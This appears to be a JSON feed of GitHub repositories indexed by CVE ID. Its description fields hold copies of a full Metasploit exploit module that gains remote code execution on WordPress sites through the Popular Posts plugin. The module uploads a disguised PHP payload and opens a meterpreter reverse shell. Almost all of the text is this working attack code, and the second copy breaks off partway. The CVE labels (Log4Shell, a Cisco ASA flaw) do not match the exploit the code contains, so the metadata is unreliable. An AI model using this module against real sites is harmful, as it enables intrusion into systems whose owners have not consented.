{
  "date": "2022-01-02",
  "count": 3,
  "cves": [
    {
      "cve_id": "CVE-2021-44228",
      "repo_info": "[Nate0634034090/-nate158.res.codeRex.sleepsession.type.to_s.eql-shell-](https://github.com/Nate0634034090/-nate158.res.codeRex.sleepsession.type.to_s.eql-shell-)",
      "description": "## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule &lt; Msf::Exploit::Remote   Rank = NormalRanking    prepend Msf::Exploit::Remote::AutoCheck   include Msf::Exploit::FileDropper   include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::Remote::HttpServer   include Msf::Exploit::Remote::HTTP::Wordpress    def initialize(info = {})     super(       update_info(         info,         &#x27;Name&#x27; =&gt; &#x27;Wordpress Popular Posts Authenticated RCE&#x27;,         &#x27;Description&#x27; =&gt; %q{           This exploit requires Metasploit to have a FQDN and the ability to run a payload web server on port 80, 443, or 8080.           The FQDN must also not resolve to a reserved address (192/172/127/10).  The server must also respond to a HEAD request           for the payload, prior to getting a GET request.           This exploit leverages an authenticated improper input validation in Wordpress plugin Popular Posts &lt;= 5.3.2.           The exploit chain is rather complicated.  Authentication is required and &#x27;gd&#x27; for PHP is required on the server.           Then the Popular Post plugin is reconfigured to allow for an arbitrary URL for the post image in the widget.           A post is made, then requests are sent to the post to make it more popular than the previous #1 by 5. Once           the post hits the top 5, and after a 60sec (we wait 90) server cache refresh, the homepage widget is loaded           which triggers the plugin to download the payload from our server. Our payload has a &#x27;GIF&#x27; header, and a           double extension (&#x27;.gif.php&#x27;) allowing for arbitrary PHP code to be executed.         },         &#x27;License&#x27; =&gt; MSF_LICENSE,         &#x27;Author&#x27; =&gt; [           &#x27;h00die&#x27;, # msf module           &#x27;Simone Cristofaro&#x27;, # edb           &#x27;Jerome Bruandet&#x27; # original analysis         ],         &#x27;References&#x27; =&gt; [           [ &#x27;EDB&#x27;, &#x27;50129&#x27; ],           [ &#x27;URL&#x27;, &#x27;https://blog.nintechnet.com/improper-input-validation-fixed-in-wordpress-popular-posts-plugin/&#x27; ],           [ &#x27;WPVDB&#x27;, &#x27;bd4f157c-a3d7-4535-a587-0102ba4e3009&#x27; ],           [ &#x27;URL&#x27;, &#x27;https://plugins.trac.wordpress.org/changeset/2542638&#x27; ],           [ &#x27;URL&#x27;, &#x27;https://github.com/cabrerahector/wordpress-popular-posts/commit/d9b274cf6812eb446e4103cb18f69897ec6fe601&#x27; ],           [ &#x27;CVE&#x27;, &#x27;2021-42362&#x27; ]         ],         &#x27;Platform&#x27; =&gt; [&#x27;php&#x27;],         &#x27;Stance&#x27; =&gt; Msf::Exploit::Stance::Aggressive,         &#x27;Privileged&#x27; =&gt; false,         &#x27;Arch&#x27; =&gt; ARCH_PHP,         &#x27;Targets&#x27; =&gt; [           [ &#x27;Automatic Target&#x27;, {}]         ],         &#x27;DisclosureDate&#x27; =&gt; &#x27;2021-06-11&#x27;,         &#x27;DefaultTarget&#x27; =&gt; 0,         &#x27;DefaultOptions&#x27; =&gt; {           &#x27;PAYLOAD&#x27; =&gt; &#x27;php/meterpreter/reverse_tcp&#x27;,           &#x27;WfsDelay&#x27; =&gt; 3000 # 50 minutes, other visitors to the site may trigger         },         &#x27;Notes&#x27; =&gt; {           &#x27;Stability&#x27; =&gt; [ CRASH_SAFE ],           &#x27;SideEffects&#x27; =&gt; [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ],           &#x27;Reliability&#x27; =&gt; [ REPEATABLE_SESSION ]         }       )     )      register_options [       OptString.new(&#x27;USERNAME&#x27;, [true, &#x27;Username of the account&#x27;, &#x27;admin&#x27;]),       OptString.new(&#x27;PASSWORD&#x27;, [true, &#x27;Password of the account&#x27;, &#x27;admin&#x27;]),       OptString.new(&#x27;TARGETURI&#x27;, [true, &#x27;The base path of the Wordpress server&#x27;, &#x27;/&#x27;]),       # https://github.com/WordPress/wordpress-develop/blob/5.8/src/wp-includes/http.php#L560       OptString.new(&#x27;SRVHOSTNAME&#x27;, [true, &#x27;FQDN of the metasploit server. Must not resolve to a reserved address (192/10/127/172)&#x27;, &#x27;&#x27;]),       # https://github.com/WordPress/wordpress-develop/blob/5.8/src/wp-includes/http.php#L584       OptEnum.new(&#x27;SRVPORT&#x27;, [true, &#x27;The local port to listen on.&#x27;, &#x27;login&#x27;, [&#x27;80&#x27;, &#x27;443&#x27;, &#x27;8080&#x27;]]),     ]   end    def check     return CheckCode::Safe(&#x27;Wordpress not detected.&#x27;) unless wordpress_and_online?      checkcode = check_plugin_version_from_readme(&#x27;wordpress-popular-posts&#x27;, &#x27;5.3.3&#x27;)     if checkcode == CheckCode::Safe       print_error(&#x27;Popular Posts not a vulnerable version&#x27;)     end     return checkcode   end    def trigger_payload(on_disk_payload_name)     res = send_request_cgi(       &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path),       &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;     )     # loop this 5 times just incase there is a time delay in writing the file by the server     (1..5).each do -i-       print_status(&quot;Triggering shell at: #{normalize_uri(target_uri.path, &#x27;wp-content&#x27;, &#x27;uploads&#x27;, &#x27;wordpress-popular-posts&#x27;, on_disk_payload_name)} in 10 seconds. Attempt #{i} of 5&quot;)       Rex.sleep(10)       res = send_request_cgi(         &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-content&#x27;, &#x27;uploads&#x27;, &#x27;wordpress-popular-posts&#x27;, on_disk_payload_name),         &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;       )     end     if res &amp;&amp; res.code == 404       print_error(&#x27;Failed to find payload, may not have uploaded correctly.&#x27;)     end   end    def on_request_uri(cli, request, payload_name, post_id)     if request.method == &#x27;HEAD&#x27;       print_good(&#x27;Responding to initial HEAD request (passed check 1)&#x27;)       # according to https://stackoverflow.com/questions/3854842/content-length-header-with-head-requests we should have a valid Content-Length       # however that seems to be calculated dynamically, as it is overwritten to 0 on this response. leaving here as notes.       # also didn&#x27;t want to send the true payload in the body to make the size correct as that gives a higher chance of us getting caught       return send_response(cli, &#x27;&#x27;, { &#x27;Content-Type&#x27; =&gt; &#x27;image/gif&#x27;, &#x27;Content-Length&#x27; =&gt; &quot;GIF#{payload.encoded}&quot;.length.to_s })     end     if request.method == &#x27;GET&#x27;       on_disk_payload_name = &quot;#{post_id}_#{payload_name}&quot;       register_file_for_cleanup(on_disk_payload_name)       print_good(&#x27;Responding to GET request (passed check 2)&#x27;)       send_response(cli, &quot;GIF#{payload.encoded}&quot;, &#x27;Content-Type&#x27; =&gt; &#x27;image/gif&#x27;)       close_client(cli) # for some odd reason we need to close the connection manually for PHP/WP to finish its functions       Rex.sleep(2) # wait for WP to finish all the checks it needs       trigger_payload(on_disk_payload_name)     end     print_status(&quot;Received unexpected #{request.method} request&quot;)   end    def check_gd_installed(cookie)     vprint_status(&#x27;Checking if gd is installed&#x27;)     res = send_request_cgi(       &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;options-general.php&#x27;),       &#x27;method&#x27; =&gt; &#x27;GET&#x27;,       &#x27;cookie&#x27; =&gt; cookie,       &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,       &#x27;vars_get&#x27; =&gt; {         &#x27;page&#x27; =&gt; &#x27;wordpress-popular-posts&#x27;,         &#x27;tab&#x27; =&gt; &#x27;debug&#x27;       }     )     fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res     fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200     res.body.include? &#x27; gd&#x27;   end    def get_wpp_admin_token(cookie)     vprint_status(&#x27;Retrieving wpp_admin token&#x27;)     res = send_request_cgi(       &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;options-general.php&#x27;),       &#x27;method&#x27; =&gt; &#x27;GET&#x27;,       &#x27;cookie&#x27; =&gt; cookie,       &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,       &#x27;vars_get&#x27; =&gt; {         &#x27;page&#x27; =&gt; &#x27;wordpress-popular-posts&#x27;,         &#x27;tab&#x27; =&gt; &#x27;tools&#x27;       }     )     fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res     fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200     /&lt;input type=&quot;hidden&quot; id=&quot;wpp-admin-token&quot; name=&quot;wpp-admin-token&quot; value=&quot;([^&quot;]*)/ =~ res.body     Regexp.last_match(1)   end    def change_settings(cookie, token)     vprint_status(&#x27;Updating popular posts settings for images&#x27;)     res = send_request_cgi(       &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;options-general.php&#x27;),       &#x27;method&#x27; =&gt; &#x27;POST&#x27;,       &#x27;cookie&#x27; =&gt; cookie,       &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,       &#x27;vars_get&#x27; =&gt; {         &#x27;page&#x27; =&gt; &#x27;wordpress-popular-posts&#x27;,         &#x27;tab&#x27; =&gt; &#x27;debug&#x27;       },       &#x27;vars_post&#x27; =&gt; {         &#x27;upload_thumb_src&#x27; =&gt; &#x27;&#x27;,         &#x27;thumb_source&#x27; =&gt; &#x27;custom_field&#x27;,         &#x27;thumb_lazy_load&#x27; =&gt; 0,         &#x27;thumb_field&#x27; =&gt; &#x27;wpp_thumbnail&#x27;,         &#x27;thumb_field_resize&#x27; =&gt; 1,         &#x27;section&#x27; =&gt; &#x27;thumb&#x27;,         &#x27;wpp-admin-token&#x27; =&gt; token       }     )     fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res     fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200     fail_with(Failure::UnexpectedReply, &#x27;Unable to save/change settings&#x27;) unless /&lt;strong&gt;Settings saved/ =~ res.body   end    def clear_cache(cookie, token)     vprint_status(&#x27;Clearing image cache&#x27;)     res = send_request_cgi(       &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;options-general.php&#x27;),       &#x27;method&#x27; =&gt; &#x27;POST&#x27;,       &#x27;cookie&#x27; =&gt; cookie,       &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,       &#x27;vars_get&#x27; =&gt; {         &#x27;page&#x27; =&gt; &#x27;wordpress-popular-posts&#x27;,         &#x27;tab&#x27; =&gt; &#x27;debug&#x27;       },       &#x27;vars_post&#x27; =&gt; {         &#x27;action&#x27; =&gt; &#x27;wpp_clear_thumbnail&#x27;,         &#x27;wpp-admin-token&#x27; =&gt; token       }     )     fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res     fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200   end    def enable_custom_fields(cookie, custom_nonce, post)     # this should enable the ajax_nonce, it will 302 us back to the referer page as well so we can get it.     res = send_request_cgi!(       &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;post.php&#x27;),       &#x27;cookie&#x27; =&gt; cookie,       &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,       &#x27;method&#x27; =&gt; &#x27;POST&#x27;,       &#x27;vars_post&#x27; =&gt; {         &#x27;toggle-custom-fields-nonce&#x27; =&gt; custom_nonce,         &#x27;_wp_http_referer&#x27; =&gt; &quot;#{normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;post.php&#x27;)}?post=#{post}&amp;action=edit&quot;,         &#x27;action&#x27; =&gt; &#x27;toggle-custom-fields&#x27;       }     )     /name=&quot;_ajax_nonce-add-meta&quot; value=&quot;([^&quot;]*)/ =~ res.body     Regexp.last_match(1)   end    def create_post(cookie)     vprint_status(&#x27;Creating new post&#x27;)     # get post ID and nonces     res = send_request_cgi(       &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;post-new.php&#x27;),       &#x27;cookie&#x27; =&gt; cookie,       &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;     )     fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res     fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200     /name=&quot;_ajax_nonce-add-meta&quot; value=&quot;(?&lt;ajax_nonce&gt;[^&quot;]*)/ =~ res.body     /wp.apiFetch.nonceMiddleware = wp.apiFetch.createNonceMiddleware\\( &quot;(?&lt;wp_nonce&gt;[^&quot;]*)/ =~ res.body     /},&quot;post&quot;:{&quot;id&quot;:(?&lt;post_id&gt;\\d*)/ =~ res.body     if ajax_nonce.nil?       print_error(&#x27;missing ajax nonce field, attempting to re-enable. if this fails, you may need to change the interface to enable this.  See https://www.hostpapa.com/knowledgebase/add-custom-meta-boxes-wordpress-posts/. Or check (while writing a post) Options &gt; Preferences &gt; Panels &gt; Additional &gt; Custom Fields.&#x27;)       /name=&quot;toggle-custom-fields-nonce&quot; value=&quot;(?&lt;custom_nonce&gt;[^&quot;]*)/ =~ res.body       ajax_nonce = enable_custom_fields(cookie, custom_nonce, post_id)     end     unless ajax_nonce.nil?       vprint_status(&quot;ajax nonce: #{ajax_nonce}&quot;)     end     unless wp_nonce.nil?       vprint_status(&quot;wp nonce: #{wp_nonce}&quot;)     end     unless post_id.nil?       vprint_status(&quot;Created Post: #{post_id}&quot;)     end     fail_with(Failure::UnexpectedReply, &#x27;Unable to retrieve nonces and/or new post id&#x27;) unless ajax_nonce &amp;&amp; wp_nonce &amp;&amp; post_id      # publish new post     vprint_status(&quot;Writing content to Post: #{post_id}&quot;)     # this is very different from the EDB POC, I kept getting 200 to the home page with their example, so this is based off what the UI submits     res = send_request_cgi(       &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;index.php&#x27;),       &#x27;method&#x27; =&gt; &#x27;POST&#x27;,       &#x27;cookie&#x27; =&gt; cookie,       &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,       &#x27;ctype&#x27; =&gt; &#x27;application/json&#x27;,       &#x27;accept&#x27; =&gt; &#x27;application/json&#x27;,       &#x27;vars_get&#x27; =&gt; {         &#x27;_locale&#x27; =&gt; &#x27;user&#x27;,         &#x27;rest_route&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp&#x27;, &#x27;v2&#x27;, &#x27;posts&#x27;, post_id)       },       &#x27;data&#x27; =&gt; {         &#x27;id&#x27; =&gt; post_id,         &#x27;title&#x27; =&gt; Rex::Text.rand_text_alphanumeric(20..30),         &#x27;content&#x27; =&gt; &quot;&lt;!-- wp:paragraph --&gt;\\n&lt;p&gt;#{Rex::Text.rand_text_alphanumeric(100..200)}&lt;/p&gt;\\n&lt;!-- /wp:paragraph --&gt;&quot;,         &#x27;status&#x27; =&gt; &#x27;publish&#x27;       }.to_json,       &#x27;headers&#x27; =&gt; {         &#x27;X-WP-Nonce&#x27; =&gt; wp_nonce,         &#x27;X-HTTP-Method-Override&#x27; =&gt; &#x27;PUT&#x27;       }     )      fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res     fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200     fail_with(Failure::UnexpectedReply, &#x27;Post failed to publish&#x27;) unless res.body.include? &#x27;&quot;status&quot;:&quot;publish&quot;&#x27;     return post_id, ajax_nonce, wp_nonce   end    def add_meta(cookie, post_id, ajax_nonce, payload_name)     payload_url = &quot;http://#{datastore[&#x27;SRVHOSTNAME&#x27;]}:#{datastore[&#x27;SRVPORT&#x27;]}/#{payload_name}&quot;     vprint_status(&quot;Adding malicious metadata for redirect to #{payload_url}&quot;)     res = send_request_cgi(       &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;admin-ajax.php&#x27;),       &#x27;method&#x27; =&gt; &#x27;POST&#x27;,       &#x27;cookie&#x27; =&gt; cookie,       &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,       &#x27;vars_post&#x27; =&gt; {         &#x27;_ajax_nonce&#x27; =&gt; 0,         &#x27;action&#x27; =&gt; &#x27;add-meta&#x27;,         &#x27;metakeyselect&#x27; =&gt; &#x27;wpp_thumbnail&#x27;,         &#x27;metakeyinput&#x27; =&gt; &#x27;&#x27;,         &#x27;metavalue&#x27; =&gt; payload_url,         &#x27;_ajax_nonce-add-meta&#x27; =&gt; ajax_nonce,         &#x27;post_id&#x27; =&gt; post_id       }     )     fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res     fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200     fail_with(Failure::UnexpectedReply, &#x27;Failed to update metadata&#x27;) unless res.body.include? &quot;&lt;tr id=&#x27;meta-&quot;   end    def boost_post(cookie, post_id, wp_nonce, post_count)     # redirect as needed     res = send_request_cgi(       &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;index.php&#x27;),       &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,       &#x27;cookie&#x27; =&gt; cookie,       &#x27;vars_get&#x27; =&gt; { &#x27;page_id&#x27; =&gt; post_id }     )     fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res     fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200 -- res.code == 301     print_status(&quot;Sending #{post_count} views to #{res.headers[&#x27;Location&#x27;]}&quot;)     location = res.headers[&#x27;Location&#x27;].split(&#x27;/&#x27;)[3...-1].join(&#x27;/&#x27;) # http://example.com/&lt;take this value&gt;/&lt;and anything after&gt;     (1..post_count).each do -_c-       res = send_request_cgi!(         &#x27;uri&#x27; =&gt; &quot;/#{location}&quot;,         &#x27;cookie&#x27; =&gt; cookie,         &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;       )       # just send away, who cares about the response       fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res       fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 200       res = send_request_cgi(         # this URL varies from the POC on EDB, and is modeled after what the browser does         &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;index.php&#x27;),         &#x27;vars_get&#x27; =&gt; {           &#x27;rest_route&#x27; =&gt; normalize_uri(&#x27;wordpress-popular-posts&#x27;, &#x27;v1&#x27;, &#x27;popular-posts&#x27;)         },         &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,         &#x27;method&#x27; =&gt; &#x27;POST&#x27;,         &#x27;cookie&#x27; =&gt; cookie,         &#x27;vars_post&#x27; =&gt; {           &#x27;_wpnonce&#x27; =&gt; wp_nonce,           &#x27;wpp_id&#x27; =&gt; post_id,           &#x27;sampling&#x27; =&gt; 0,           &#x27;sampling_rate&#x27; =&gt; 100         }       )       fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res       fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless res.code == 201     end     fail_with(Failure::Unreachable, &#x27;Site not responding&#x27;) unless res   end    def get_top_posts     print_status(&#x27;Determining post with most views&#x27;)     res = get_widget     /&gt;(?&lt;views&gt;\\d+) views&lt;/ =~ res.body     views = views.to_i     print_status(&quot;Top Views: #{views}&quot;)     views += 5 # make us the top post     unless datastore[&#x27;VISTS&#x27;].nil?       print_status(&quot;Overriding post count due to VISITS being set, from #{views} to #{datastore[&#x27;VISITS&#x27;]}&quot;)       views = datastore[&#x27;VISITS&#x27;]     end     views   end    def get_widget     # load home page to grab the widget ID. At times we seem to hit the widget when it&#x27;s refreshing and it doesn&#x27;t respond     # which then would kill the exploit, so in this case we just keep trying.     (1..10).each do -_-       @res = send_request_cgi(         &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path),         &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;       )       break unless @res.nil?     end     fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless @res.code == 200     /data-widget-id=&quot;wpp-(?&lt;widget_id&gt;\\d+)/ =~ @res.body     # load the widget directly     (1..10).each do -_-       @res = send_request_cgi(         &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;index.php&#x27;, &#x27;wp-json&#x27;, &#x27;wordpress-popular-posts&#x27;, &#x27;v1&#x27;, &#x27;popular-posts&#x27;, &#x27;widget&#x27;, widget_id),         &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;,         &#x27;vars_get&#x27; =&gt; {           &#x27;is_single&#x27; =&gt; 0         }       )       break unless @res.nil?     end     fail_with(Failure::UnexpectedReply, &#x27;Failed to retrieve page&#x27;) unless @res.code == 200     @res   end    def exploit     fail_with(Failure::BadConfig, &#x27;SRVHOST must be set to an IP address (0.0.0.0 is invalid) for exploitation to be successful&#x27;) if datastore[&#x27;SRVHOST&#x27;] == &#x27;0.0.0.0&#x27;     cookie = wordpress_login(datastore[&#x27;USERNAME&#x27;], datastore[&#x27;PASSWORD&#x27;])      if cookie.nil?       vprint_error(&#x27;Invalid login, check credentials&#x27;)       return     end      payload_name = &quot;#{Rex::Text.rand_text_alphanumeric(5..8)}.gif.php&quot;     vprint_status(&quot;Payload file name: #{payload_name}&quot;)      fail_with(Failure::NotVulnerable, &#x27;gd is not installed on server, uexploitable&#x27;) unless check_gd_installed(cookie)     post_count = get_top_posts      # we dont need to pass the cookie anymore since its now saved into http client     token = get_wpp_admin_token(cookie)     vprint_status(&quot;wpp_admin_token: #{token}&quot;)     change_settings(cookie, token)     clear_cache(cookie, token)     post_id, ajax_nonce, wp_nonce = create_post(cookie)     print_status(&#x27;Starting web server to handle request for image payload&#x27;)     start_service({       &#x27;Uri&#x27; =&gt; {         &#x27;Proc&#x27; =&gt; proc { -cli, req- on_request_uri(cli, req, payload_name, post_id) },         &#x27;Path&#x27; =&gt; &quot;/#{payload_name}&quot;       }     })      add_meta(cookie, post_id, ajax_nonce, payload_name)     boost_post(cookie, post_id, wp_nonce, post_count)     print_status(&#x27;Waiting 90sec for cache refresh by server&#x27;)     Rex.sleep(90)     print_status(&#x27;Attempting to force loading of shell by visiting to homepage and loading the widget&#x27;)     res = get_widget     print_good(&#x27;We made it to the top!&#x27;) if res.body.include? payload_name     # if res.body.include? datastore[&#x27;SRVHOSTNAME&#x27;]     #  fail_with(Failure::UnexpectedReply, &quot;Found #{datastore[&#x27;SRVHOSTNAME&#x27;]} in page content. Payload likely wasn&#x27;t copied to the server.&quot;)     # end     # at this point, we rely on our web server getting requests to make the rest happen   end end",
      "date": "2022-01-02",
      "raw_date": "2022-01-02T07:48:47Z"
    },
    {
      "cve_id": "CVE-2020-3452",
      "repo_info": "[Nate0634034090/nate158g-m-w-n-l-p-d-a-o-e](https://github.com/Nate0634034090/nate158g-m-w-n-l-p-d-a-o-e)",
      "description": "### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote  Rank = NormalRanking  prepend Msf::Exploit::Remote::AutoCheck  include Msf::Exploit::FileDropper  include Msf::Exploit::Remote::HttpClient  include Msf::Exploit::Remote::HttpServer  include Msf::Exploit::Remote::HTTP::Wordpress  def initialize(info = {})    super(      update_info(        info,        &#x27;Name&#x27; =&gt; &#x27;Wordpress Popular Posts Authenticated RCE&#x27;,        &#x27;Description&#x27; =&gt; %q{          This exploit requires Metasploit to have a FQDN and the ability to run a payload web server on port 80, 443, or 8080.          The FQDN must also not resolve to a reserved address (192/172/127/10).  The server must also respond to a HEAD request          for the payload, prior to getting a GET request.          This exploit leverages an authenticated improper input validation in Wordpress plugin Popular Posts &lt;= 5.3.2.          The exploit chain is rather complicated.  Authentication is required and &#x27;gd&#x27; for PHP is required on the server.          Then the Popular Post plugin is reconfigured to allow for an arbitrary URL for the post image in the widget.          A post is made, then requests are sent to the post to make it more popular than the previous #1 by 5. Once          the post hits the top 5, and after a 60sec (we wait 90) server cache refresh, the homepage widget is loaded          which triggers the plugin to download the payload from our server. Our payload has a &#x27;GIF&#x27; header, and a          double extension (&#x27;.gif.php&#x27;) allowing for arbitrary PHP code to be executed.        },        &#x27;License&#x27; =&gt; MSF_LICENSE,        &#x27;Author&#x27; =&gt; [          &#x27;h00die&#x27;, # msf module          &#x27;Simone Cristofaro&#x27;, # edb          &#x27;Jerome Bruandet&#x27; # original analysis        ],        &#x27;References&#x27; =&gt; [          [ &#x27;EDB&#x27;, &#x27;50129&#x27; ],          [ &#x27;URL&#x27;, &#x27;https://blog.nintechnet.com/improper-input-validation-fixed-in-wordpress-popular-posts-plugin/&#x27; ],          [ &#x27;WPVDB&#x27;, &#x27;bd4f157c-a3d7-4535-a587-0102ba4e3009&#x27; ],          [ &#x27;URL&#x27;, &#x27;https://plugins.trac.wordpress.org/changeset/2542638&#x27; ],          [ &#x27;URL&#x27;, &#x27;https://github.com/cabrerahector/wordpress-popular-posts/commit/d9b274cf6812eb446e4103cb18f69897ec6fe601&#x27; ],          [ &#x27;CVE&#x27;, &#x27;2021-42362&#x27; ]        ],        &#x27;Platform&#x27; =&gt; [&#x27;php&#x27;],        &#x27;Stance&#x27; =&gt; Msf::Exploit::Stance::Aggressive,        &#x27;Privileged&#x27; =&gt; false,        &#x27;Arch&#x27; =&gt; ARCH_PHP,        &#x27;Targets&#x27; =&gt; [          [ &#x27;Automatic Target&#x27;, {}]        ],        &#x27;DisclosureDate&#x27; =&gt; &#x27;2021-06-11&#x27;,        &#x27;DefaultTarget&#x27; =&gt; 0,        &#x27;DefaultOptions&#x27; =&gt; {          &#x27;PAYLOAD&#x27; =&gt; &#x27;php/meterpreter/reverse_tcp&#x27;,          &#x27;WfsDelay&#x27; =&gt; 3000 # 50 minutes, other visitors to the site may trigger        },        &#x27;Notes&#x27; =&gt; {          &#x27;Stability&#x27; =&gt; [ CRASH_SAFE ],          &#x27;SideEffects&#x27; =&gt; [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ],          &#x27;Reliability&#x27; =&gt; [ REPEATABLE_SESSION ]        }      )    )    register_options [      OptString.new(&#x27;USERNAME&#x27;, [true, &#x27;Username of the account&#x27;, &#x27;admin&#x27;]),      OptString.new(&#x27;PASSWORD&#x27;, [true, &#x27;Password of the account&#x27;, &#x27;admin&#x27;]),      OptString.new(&#x27;TARGETURI&#x27;, [true, &#x27;The base path of the Wordpress server&#x27;, &#x27;/&#x27;]),      # https://github.com/WordPress/wordpress-develop/blob/5.8/src/wp-includes/http.php#L560      OptString.new(&#x27;SRVHOSTNAME&#x27;, [true, &#x27;FQDN of the metasploit server. Must not resolve to a reserved address (192/10/127/172)&#x27;, &#x27;&#x27;]),      # https://github.com/WordPress/wordpress-develop/blob/5.8/src/wp-includes/http.php#L584      OptEnum.new(&#x27;SRVPORT&#x27;, [true, &#x27;The local port to listen on.&#x27;, &#x27;login&#x27;, [&#x27;80&#x27;, &#x27;443&#x27;, &#x27;8080&#x27;]]),    ]  end  def check    return CheckCode::Safe(&#x27;Wordpress not detected.&#x27;) unless wordpress_and_online?    checkcode = check_plugin_version_from_readme(&#x27;wordpress-popular-posts&#x27;, &#x27;5.3.3&#x27;)    if checkcode == CheckCode::Safe      print_error(&#x27;Popular Posts not a vulnerable version&#x27;)    end    return checkcode  end  def trigger_payload(on_disk_payload_name)    res = send_request_cgi(      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path),      &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;    )    # loop this 5 times just incase there is a time delay in writing the file by the server    (1..5).each do -i-      print_status(&quot;Triggering shell at: #{normalize_uri(target_uri.path, &#x27;wp-content&#x27;, &#x27;uploads&#x27;, &#x27;wordpress-popular-posts&#x27;, on_disk_payload_name)} in 10 seconds. Attempt #{i} of 5&quot;)      Rex.sleep(10)      res = send_request_cgi(        &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-content&#x27;, &#x27;uploads&#x27;, &#x27;wordpress-popular-posts&#x27;, on_disk_payload_name),        &#x27;keep_cookies&#x27; =&gt; &#x27;true&#x27;      )    end    if res &amp;&amp; res.code == 404      print_error(&#x27;Failed to find payload, may not have uploaded correctly.&#x27;)    end  end  def on_request_uri(cli, request, payload_name, post_id)    if request.method == &#x27;HEAD&#x27;      print_good(&#x27;Responding to initial HEAD request (passed check 1)&#x27;)      # according to https://stackoverflow.com/questions/3854842/content-length-header-with-head-requests we should have a valid Content-Length      # however that seems to be calculated dynamically, as it is overwritten to 0 on this response. leaving here as notes.      # also didn&#x27;t want to send the true payload in the body to make the size correct as that gives a higher chance of us getting caught      return send_response(cli, &#x27;&#x27;, { &#x27;Content-Type&#x27; =&gt; &#x27;image/gif&#x27;, &#x27;Content-Length&#x27; =&gt; &quot;GIF#{payload.encoded}&quot;.length.to_s })    end    if request.method == &#x27;GET&#x27;      on_disk_payload_name = &quot;#{post_id}_#{payload_name}&quot;      register_file_for_cleanup(on_disk_payload_name)      print_good(&#x27;Responding to GET request (passed check 2)&#x27;)      send_response(cli, &quot;GIF#{payload.encoded}&quot;, &#x27;Content-Type&#x27; =&gt; &#x27;image/gif&#x27;)      close_client(cli) # for some odd reason we need to close the connection manually for PHP/WP to finish its functions      Rex.sleep(2) # wait for WP to finish all the checks it needs      trigger_payload(on_disk_payload_name)    end    print_status(&quot;Received unexpected #{request.method} request&quot;)  end  def check_gd_installed(cookie)    vprint_status(&#x27;Checking if gd is installed&#x27;)    res = send_request_cgi(      &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, &#x27;wp-admin&#x27;, &#x27;options-general.php&#x27;),      &#x27;method&#x27; =&gt; &#x27;GET&#x27;,      &#x27;cookie&#x27; =&gt; cookie,      